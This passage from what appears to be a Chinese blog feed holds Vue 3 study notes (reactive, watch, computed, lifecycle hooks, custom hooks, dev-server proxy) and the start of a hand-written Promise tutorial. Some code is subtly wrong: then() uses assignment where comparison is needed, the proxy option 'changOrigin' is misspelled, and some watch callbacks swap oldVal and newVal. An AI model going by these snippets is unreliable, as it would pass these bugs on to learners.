class="line">&#125;)</span><br></pre></td></tr></table></figure><p>更改数据的时候只需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">job.salary=&#x27;60k&#x27;</span><br><span class="line">console.log(job)</span><br></pre></td></tr></table></figure><p>我们的ref管理的基本类型数据也可以通过封装成对象中的属性让reactive进行管理</p><p>在vue2中我们的新增和删除要体现在页面上需要使用</p><p>Vue.delete()和Vue.set()或者this.$set()和this.$delete()</p><p>vue3中的响应式，只要是reactive中管理的数据，我们就可以直接使用delete删除</p><p>vue3是通过proxy调用set和get进行数据的更改，deleteProperty实现删除</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\vue3\proxy.png" alt="proxy"></p><p>在vue2中我们使用props实现父向子传值，子组件接收需要使用props</p><p>但是如果不使用props，我们也能在vc身上的<code>$attr</code>中看到</p><p>在vue3中setup的执行时间比beforeCreate早</p><p>而且setup中的this是undefined</p><p>setup中的参数第一个是 props第二个是context</p><h4 id="3-3-1使用自定义事件"><a href="#3-3-1使用自定义事件" class="headerlink" title="3.3.1使用自定义事件"></a>3.3.1使用自定义事件</h4><p>vue3中的自定义事件与vue2有区别</p><p>首先向子组件传值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;setUp user=&quot;pigeon&quot; pwd=&quot;123456&quot; @hello=&quot;hello&quot;&gt;&lt;/setUp&gt;</span><br></pre></td></tr></table></figure><p>然后在子组件接收</p><p>注意与vue2不同vue3中需要使用emits属性获取传入的自定义事件，然后使用context参数（必须是把前面的props写上，因为context是第二个参数）触发传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    emits: [&#x27;hello&#x27;],</span><br><span class="line">    setup(prop,context) &#123;</span><br><span class="line">        function hello()&#123;</span><br><span class="line">            context.emit(&#x27;hello&#x27;,666)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return&#123;</span><br><span class="line">            hello</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-计算属性与监视"><a href="#4-计算属性与监视" class="headerlink" title="4.计算属性与监视"></a>4.计算属性与监视</h2><h3 id="4-1-computed"><a href="#4-1-computed" class="headerlink" title="4.1 computed"></a>4.1 computed</h3><p>vue3中也可以vue2的计算属性，但是不推荐</p><p>vue3中的计算属性需要引入然后写入在setup中</p><p>我们写一个案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import &#123; reactive, computed &#125; from &#x27;vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;setUp&#x27;,</span><br><span class="line">    setup() &#123;</span><br><span class="line">        let person = reactive(&#123;</span><br><span class="line">            firstName : &#x27;tony&#x27;,</span><br><span class="line">            lastName : &#x27;stake&#x27;,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        // //书写计算属性使用computed-简写形式</span><br><span class="line">        // person.fullName = computed(()=&gt;&#123;</span><br><span class="line">        //     return person.firstName+&#x27;-&#x27;+person.lastName</span><br><span class="line">        // &#125;)</span><br><span class="line"></span><br><span class="line">        // getter 和setter形式</span><br><span class="line">        person.fullName = computed(&#123;</span><br><span class="line">            get()&#123;</span><br><span class="line">                return person.firstName+&#x27;-&#x27;+person.lastName</span><br><span class="line">            &#125;,</span><br><span class="line">            set(newVal)&#123;</span><br><span class="line">                const nameArr = newVal.split(&#x27;-&#x27;)</span><br><span class="line">                person.firstName=nameArr[0]</span><br><span class="line">                person.lastName=nameArr[1]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return&#123;</span><br><span class="line">            person</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和vue2一样如果需要修改计算得到的值要把计算属性写成扩写形式，写出set方法</p><h3 id="4-2-监视属性"><a href="#4-2-监视属性" class="headerlink" title="4.2 监视属性"></a>4.2 监视属性</h3><h4 id="ref"><a href="#ref" class="headerlink" title="ref:"></a>ref:</h4><p>对ref使用监视属性监视简单数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ref, watch &#125; from &#x27;vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;setUp&#x27;,</span><br><span class="line">    setup() &#123;</span><br><span class="line">        let sum = ref(0)</span><br><span class="line">        let msg = ref(&#x27;hello&#x27;)</span><br><span class="line">        //watch-情况一</span><br><span class="line">        // watch(sum, (newVal,oldVal)=&gt;&#123;</span><br><span class="line">        //     console.log(&quot;sum改变了&quot;+oldVal+newVal);</span><br><span class="line">        // &#125;)</span><br><span class="line">        </span><br><span class="line">        //watch-情况二-监视多个</span><br><span class="line">        watch([sum, msg], (newVal,oldVal)=&gt;&#123;</span><br><span class="line">            console.log(oldVal,newVal);</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        return&#123;</span><br><span class="line">            sum,</span><br><span class="line">            msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意情况二的数据，得到的oldVal和newVal是数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, &#x27;hello&#x27;] =&gt; [0, &#x27;hello&#x27;]</span><br></pre></td></tr></table></figure><p>当需要打开深度监视和立即监视的时候在后面写配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch(sum, (oldVal,newVal)=&gt;&#123;</span><br><span class="line">    console.log(&quot;sum改变了&quot;+oldVal+newVal);</span><br><span class="line">&#125;,&#123;immediate:true, deep:true&#125;)</span><br></pre></td></tr></table></figure><h4 id="reactive："><a href="#reactive：" class="headerlink" title="reactive："></a>reactive：</h4><p>reactive操作对象数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">个人信息：&lt;input v-model=&quot;person.name&quot;/&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;input v-model=&quot;person.age&quot;/&gt;</span><br></pre></td></tr></table></figure><p>我们使用reactive包裹一个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let person = reactive(&#123;</span><br><span class="line">    name:&#x27;on&#x27;,</span><br><span class="line">    age:&#x27;18&#x27;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//watch-情况三-监视对象</span><br><span class="line">watch(person,(oldVal,newVal)=&gt;&#123;</span><br><span class="line">    console.log(oldVal,newVal);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我们得到的数据是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxy &#123;name: &#x27;jkl&#x27;, age: &#x27;18&#x27;&#125; =&gt; Proxy &#123;name: &#x27;jkl&#x27;, age: &#x27;18&#x27;&#125;</span><br></pre></td></tr></table></figure><p>我们发现没有oldValue了，只有newValue，而且自动开启了<strong>深度监视</strong></p><p>如果我们需要使用oldValue就只有使用ref</p><p>还有几种情况：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\vue3\watch的几种情况.png" alt="watch的几种情况"></p><p>注意一个特殊情况：这里的job是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">job:&#123;</span><br><span class="line">    j1:&#123;</span><br><span class="line">        salary:&quot;1K&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果要监视一种属性，要监听里面的数据，要用到深度监视配置deep</strong></p><h4 id="value："><a href="#value：" class="headerlink" title="value："></a>value：</h4><p>我们使用ref包裹基本数据的时候，很多人会习惯了<code>.value</code>，但是在watch中，我们不能使用<code>.value</code>，因为value取到的是值，但是我们需要监视的是一个<code>RefImpl</code>的结构</p><p>但是如果我们包裹的是对象数据，<strong>情况就不一样了</strong>，我们就需要使用<code>.value</code>，因为对象中的<code>.value</code>是一个proxy，它才是真正的监听数据，一般的person只是一个内存地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch(person.value,(oldVal,newVal)=&gt;&#123;</span><br><span class="line">   console.log(oldVal,newVal);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>还有一种不使用<code>.value</code>的方法，开启深度监视</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch(person,(oldVal,newVal)=&gt;&#123;</span><br><span class="line">   console.log(oldVal,newVal);</span><br><span class="line">&#125;,&#123;deep: true&#125;)</span><br></pre></td></tr></table></figure><h4 id="watchEffect："><a href="#watchEffect：" class="headerlink" title="watchEffect："></a>watchEffect：</h4><p>vue3中的新属性</p><p>官方文档的定义：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">watchEffect(()=&gt;&#123;</span><br><span class="line">    const x = person.name;</span><br><span class="line">    console.log(&quot;name改变了&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们发现我们更改person.name的时候，就会触发回调</p><p>只要我们在回调中用到的数据改变，就会触发回调</p><p>其实watchEffect有点类似computed，<strong>回调中依赖的数据变化，就会执行回调</strong></p><h3 id="5-生命周期"><a href="#5-生命周期" class="headerlink" title="5.生命周期"></a>5.生命周期</h3><p>生命周期大体上和vue2差不多，更新了两个钩子</p><p>取消了beforedestroy和destroy</p><p>更新了：</p><p>beforeUnmount</p><p>在一个组件实例被卸载之前调用。</p><ul><li><p><strong>类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface ComponentOptions &#123;</span><br><span class="line">  beforeUnmount?(this: ComponentPublicInstance): void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>详细信息</strong></p><p>当这个钩子被调用时，组件实例依然还保有全部的功能。</p><p><strong>这个钩子在服务端渲染时不会被调用。</strong></p></li></ul><p>和</p><p>unmounted</p><p>在一个组件实例被卸载之后调用。</p><ul><li><p><strong>类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface ComponentOptions &#123;</span><br><span class="line">  unmounted?(this: ComponentPublicInstance): void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>详细信息</strong></p><p>一个组件在以下情况下被视为已卸载：</p><ul><li>其所有子组件都已经被卸载。</li><li>所有相关的响应式作用 (渲染作用以及 <code>setup()</code> 时创建的计算属性和侦听器) 都已经停止。</li></ul><p>可以在这个钩子中手动清理一些副作用，例如计时器、DOM 事件监听器或者与服务器的连接。</p><p><strong>这个钩子在服务端渲染时不会被调用。</strong></p></li></ul><p>一般形式和我们vue2中很像，所以我们这里介绍</p><h4 id="组合式API："><a href="#组合式API：" class="headerlink" title="组合式API："></a>组合式API：</h4><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\vue3\生命周期组件式API.png" alt="生命周期组件式API"></p><p>导入之后就可以在setUp中写</p><p>导入：<code>import &#123; reactive, ref, onBeforeMount &#125; from &#39;vue&#39;;</code></p><p>使用：（在setup中）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">setup() &#123;</span><br><span class="line">    let sum = ref(0)</span><br><span class="line">    let msg = ref(&#x27;hello&#x27;)</span><br><span class="line">    let person = reactive(&#123;</span><br><span class="line">        name:&#x27;on&#x27;,</span><br><span class="line">        age:&#x27;18&#x27;,</span><br><span class="line">        job:&#123;</span><br><span class="line">            j1:&#123;</span><br><span class="line">                salary:&quot;1K&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    onBeforeMount(()=&gt;&#123;</span><br><span class="line">        console.log(&quot;===onBeforeMount===&quot;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    return&#123;</span><br><span class="line">        sum,</span><br><span class="line">        msg,</span><br><span class="line">        person,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是不提倡组合式api和函数式混用，导致项目结构不清晰</p><h3 id="6-hook"><a href="#6-hook" class="headerlink" title="6.hook"></a>6.hook</h3><p>hook是一个函数，在setup中对组合式api进行封装</p><p>比如我们需要一个获取鼠标坐标的函数，这种函数如果经常用到，我们就需要将它写成模块</p><p>这个模块就是hook</p><p>新建一个src/hook文件夹：写入文件<code>usePoint.js</code></p><p><strong>引入，暴露，函数，返回值都要有</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import &#123; reactive, onMounted, onBeforeUnmount &#125; from &#x27;vue&#x27;;</span><br><span class="line">export default function () &#123;</span><br><span class="line">    let points = reactive(&#123;</span><br><span class="line">        x: 0,</span><br><span class="line">        y: 0,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //自定义函数</span><br><span class="line">    function savePoint(event) &#123;</span><br><span class="line">        points.x = event.pageX;</span><br><span class="line">        points.y = event.pageY;</span><br><span class="line">        console.log(points.x+&quot; &quot;+points.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //生命周期钩子</span><br><span class="line">    onMounted(()=&gt;&#123;</span><br><span class="line">        window.addEventListener(&#x27;click&#x27;, savePoint)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //销毁钩子</span><br><span class="line">    onBeforeUnmount(()=&gt;&#123;</span><br><span class="line">        window.removeEventListener(&#x27;click&#x27;, savePoint)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //因为要作为函数调用，最后要返回出去</span><br><span class="line">    return points</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这个模块可以在</p><p>组件中被引入，然后通过函数调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">当前求和为：&#123;&#123;sum&#125;&#125;</span><br><span class="line">&lt;button @click=&quot;sum++&quot;&gt;点我加1&lt;/button&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">获取当前鼠标坐标：X:&#123;&#123;points.x&#125;&#125;,y:&#123;&#123;points.y&#125;&#125;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import usePoint from &#x27;@/hooks/usePoint&#x27;;</span><br><span class="line">import &#123; ref, &#125; from &#x27;vue&#x27;;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;setUp&#x27;,</span><br><span class="line">    setup() &#123;</span><br><span class="line">        let sum = ref(0)</span><br><span class="line">        </span><br><span class="line">        //获取hook中的调用</span><br><span class="line">        let points = usePoint() </span><br><span class="line"></span><br><span class="line">        return&#123;</span><br><span class="line">            sum,</span><br><span class="line">            points</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="7-toRef"><a href="#7-toRef" class="headerlink" title="7.toRef"></a>7.toRef</h3><p>当我们需要单独将name拿出来存储的时候，</p><p>有需要和之前的person产生联系使用</p><p>相当于一个浅拷贝，有引用关系和指针指向问题</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\vue3\toRef.png" alt="toRef"></p><p>或者可以使用<code>toRefs</code>对一个对象的数据进行toRef操作，如果是有深度的数据就需要使用的时候加上层级关系</p><p>但是return的时候需要使用<code>...toRefs(xxx)</code>，展开来进行返回</p><h2 id="…some-tips"><a href="#…some-tips" class="headerlink" title="…some tips"></a>…some tips</h2><h3 id="1-vue3全局挂载"><a href="#1-vue3全局挂载" class="headerlink" title="1.vue3全局挂载"></a>1.vue3全局挂载</h3><p>在vue2中使用全局挂载是直接调用Vue的原型（prototype）</p><p>但是vue3中，我们不再创建vue实例，所以无法在原型上做更改</p><p>我们引进一个全新的函数 <code>config.globalProperties</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const app = createApp(App)</span><br><span class="line">app.config.globalProperties.$axios = axios</span><br><span class="line">app.mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>这样也可以实现全局挂载的效果</p><h3 id="2-跨域配置"><a href="#2-跨域配置" class="headerlink" title="2.跨域配置"></a>2.跨域配置</h3><p>vue3的跨域问题配置也是同vue2一样在vue.config.js中（没有就创建一个）</p><p>其中target中相当于<code>baseurl</code>是跳转的一个默认地址</p><p><code>changOrigin: true,</code>实现我们允许跨域的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//vue.config.js</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    devServer: &#123;</span><br><span class="line">      open: true, //是否自动弹出浏览器页面</span><br><span class="line">      // host: &quot;localhost&quot;,</span><br><span class="line">      // port: &#x27;8080&#x27;,</span><br><span class="line">      proxy: &#123;  //配置跨域，可以配置多个跨域</span><br><span class="line">      &#x27;/api&#x27;: &#123;</span><br><span class="line">        target: &#x27;http://127.0.0.1/&#x27;,  //这里后台的地址模拟的;应该填写你们真实的后台接口</span><br><span class="line">        changOrigin: true,  //允许跨域</span><br><span class="line">        pathRewrite: &#123;</span><br><span class="line">          /* 重写路径，当我们在浏览器中看到请求的地址为：http://localhost:8080/api/core/getData/userInfo 时</span><br><span class="line">            实际上访问的地址是：http://121.121.67.254:8185/core/getData/userInfo,因为重写了 /api</span><br><span class="line">           */</span><br><span class="line">          &#x27;^/api&#x27;: &#x27;&#x27; </span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="3-获取全局实例"><a href="#3-获取全局实例" class="headerlink" title="3.获取全局实例"></a>3.获取全局实例</h3><p>因为vue3中setup不能使用this</p><p>所以为了获取我们全局挂载上的方法，我们需要使用<code>getCurrentInstance</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const &#123;proxy&#125; = getCurrentInstance()</span><br><span class="line"></span><br><span class="line">const $axios = proxy.$axios</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手写Promise</title>
    <link href="/2022/06/06/%E6%89%8B%E5%86%99Promise/"/>
    <url>/2022/06/06/%E6%89%8B%E5%86%99Promise/</url>
    
    <content type="html"><![CDATA[<h1 id="手写Promise"><a href="#手写Promise" class="headerlink" title="手写Promise"></a>手写Promise</h1><p>之前经常听前辈们说一个面试题：hr会问，你能现场手写Promise吗？</p><p>话不多说，直接手撕Promise</p><h2 id="1-Promise"><a href="#1-Promise" class="headerlink" title="1.Promise"></a>1.Promise</h2><p>先写这样一段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((reslove,reject) =&gt; &#123;</span><br><span class="line">    reslove(&quot;OK&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">p.then(value =&gt;&#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;,reason =&gt; &#123;</span><br><span class="line">    console.warn(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>既然我们要用自己写的Promise，那么就<code>srcipt</code>引入我们的<code>Promise.js</code>。问题是Promise.js中怎么写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//首先是构造函数</span><br><span class="line">function Promise(executor) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在原型上加入then方法</span><br><span class="line">Promise.prototype.then = function(onResolved,onRejected)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-reject-amp-resolve"><a href="#2-reject-amp-resolve" class="headerlink" title="2.reject &amp; resolve"></a>2.reject &amp; resolve</h2><p>我们还需要在Promise构造函数中加入reject和resolve这两个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function Promise(executor) &#123;</span><br><span class="line">   //搭建resolve和reject函数</span><br><span class="line">   function resolve(value) &#123;</span><br><span class="line">       </span><br><span class="line">   &#125; </span><br><span class="line">   function reject(reason) &#123;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   //同步调用执行器函数</span><br><span class="line">   executor(resolve,reject)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们对resolve和reject的内部逻辑进行编码：1.是更改状态State，2.是更改返回结果Result</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function resolve(value) &#123;</span><br><span class="line">    //1.更改状态</span><br><span class="line">    self.PromsieState = &#x27;fulfilled&#x27;</span><br><span class="line">    //2.更改结果</span><br><span class="line">    self.PromsieResult = value</span><br><span class="line">&#125; </span><br><span class="line">function reject(reason) &#123;</span><br><span class="line">     //1.更改状态</span><br><span class="line">     self.PromsieState = &#x27;rejected&#x27;</span><br><span class="line">     //2.更改结果</span><br><span class="line">     self.PromsieResult = reason</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种改变状态的方式—throw，抛出的错误通过try—catch捕获</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    //同步调用执行器函数</span><br><span class="line">    executor(resolve, reject)</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    reject(e)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而且我们的状态只能修改一次，所以我们修改状态的代码加一个锁，如果不是第一次修改就直接return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function resolve(value) &#123;</span><br><span class="line">    if(self.PromsieState !== &#x27;pending&#x27;) return </span><br><span class="line">    //1.更改状态</span><br><span class="line">    self.PromsieState = &#x27;fulfilled&#x27;</span><br><span class="line">    //2.更改结果</span><br><span class="line">    self.PromsieResult = value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Promise-then"><a href="#3-Promise-then" class="headerlink" title="3.Promise.then"></a>3.Promise.then</h2><p>我们还希望Promise的then方案能够收到参数并实现对于参数的输出。因为我们添加then方法的时候加入了两个函数参数（onresolved，onrejected）这两个参数分别对应了我们then方法中的两个箭头函数，现在我们将Result传入我们的函数中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Promise.prototype.then = function (onResolved, onRejected) &#123;</span><br><span class="line">    if(this.PromsieState = &#x27;fulfilled&#x27;)&#123;</span><br><span class="line">        onResolved(this.PromsieResult)//Result传入第一个函数作为实参value</span><br><span class="line">    &#125;else if(this.PromsieState = &#x27;rejected&#x27;)&#123;</span><br><span class="line">        onRejected(this.PromsieResult)</span><br><span class="line">    &#125;</span><br><span 